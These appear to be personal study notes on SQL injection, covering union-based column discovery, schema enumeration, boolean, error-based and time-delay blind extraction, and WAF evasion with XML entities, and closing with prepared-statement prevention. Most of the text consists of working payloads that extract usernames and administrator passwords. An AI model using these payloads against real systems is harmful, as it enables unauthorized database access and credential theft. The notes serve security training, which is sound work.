# Union attacks : 
General query : `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

How to determine the number of columns required ?
we use order by statment : 

	' order by 1 --, 
	' order by 2 --, 
	' order by 3 --, ...etc

until getting an error.

or
	' UNION SELECT NULL--
	' UNION SELECT NULL,NULL--
	' UNION SELECT NULL,NULL,NULL--, -etc.

for oracle, specific syntax `' UNION SELECT NULL FROM DUAL--`

Finding columns with a useful data type
we use the following payload when we know the number of columns : 

	' UNION SELECT 'a',NULL,NULL,NULL--
	' UNION SELECT NULL,'a',NULL,NULL--
	' UNION SELECT NULL,NULL,'a',NULL--
	' UNION SELECT NULL,NULL,NULL,'a'--

or 

	- UNION SELECT 1,2,3,4-- 

to retreive data, we can use  

	' UNION SELECT username, password FROM users--

another example when columns are not even 

	SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
	UNION SELECT username, 2, 3, 4 from passwords-- '


Retrieving multiple values within the same column we can use contact depending on the sql syntax

	' UNION SELECT username || '~' || password FROM users--

we can query information about the sql such as : 

	' UNION Database type	Query
	' UNION Microsoft, MySQL	SELECT @@version
	' UNION Oracle	SELECT * FROM v$version
	' UNION PostgreSQL	SELECT version()

Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
example : 

	SELECT * FROM information_schema.tables
	SELECT * FROM information_schema.columns WHERE table_name = 'Users'
	SELECT * FROM my_database.users;
	

Notes : First we have to know the database name  database 	

	SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;  // to enumrate databases;

then see the tables within the db

	select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 
	
	// !!!!! reminder number of columns don't make the mistake!!!!!!

the dump the columns 

	select COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users_xemvgh'

and then Get the data you need : 

	select username_ecephv,password_akjxku from users_xemvgh where username_ecephv = 'administrator' --

# Blind SQL Injection :
## Conditional response
blind sql injection, is when we have an injection without the visual output, the vuln occurs at the backend 

we start wy trigerring a false boolean logic and see if there is any change the page for example :

	…xyz' AND '1'='1 // here wothing will change
	…xyz' AND '1'='2 // here normaly we won't see welcome back for example.

first we start by knowing the length of the password for example : 

	xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
	xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'
	xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' 

and keep looping for all the entries until the password length.

## Error based injection
sometime we don't have some change in the web page'e behavior, we will trigger a an error and see the reponse the HTTP header.

	xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
	xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'

if we have a dirretent reponse for both quesries than we can suppose we have a blind sql injection error based.
we can go with the following payload :

	xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
### Trigger another error based sqli with output

First thing try the sql injection if there is a potential injection : 

	TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--

it should resolve an error : `Argument END should be a boolean`
and to resolve this error 

	TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--

so once the error is resolved we can inject a `select` statement.

	TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--

or 

		TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users limit 1) AS int)--

## Time delay SQLi:

Some times the developper handle errors, but that doesn't mean the injection doesn't exist.
To test if the injction exists example :

	'; IF (1=2) WAITFOR DELAY '0:0:10'--
	'; IF (1=1) WAITFOR DELAY '0:0:10'--

Using this technique, we can retrieve data by testing one character at a time:

	'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 depending on the DB, there are multipple syntaxes

 ## OAST techniques :
 //need to see this section in HTB, it's paid in Portswigger :'(

## SQL injection in different contexts
the SQL injections could also exist in JSON or XML format.
also, it exist ways to obfuscate the payload to evade WAFs:

	<stockCheck>
		<productId>123</productId>
		<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
	</stockCheck>

Using entities, can help us bypass the WAF.

## Second order sqli

it happens when attackers know Sql vuln, and use it to update table for example or adding a new user with admin privileges.

# Prevent from sqli
You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".

The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:

	String query = "SELECT * FROM products WHERE category = '"+ input + "'";
	Statement statement = connection.createStatement();
	ResultSet resultSet = statement.executeQuery(query);
You can rewrite this code in a way that prevents the user input from interfering with the query structure:

	PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
	statement.setString(1, input);
	ResultSet resultSet = statement.executeQuery();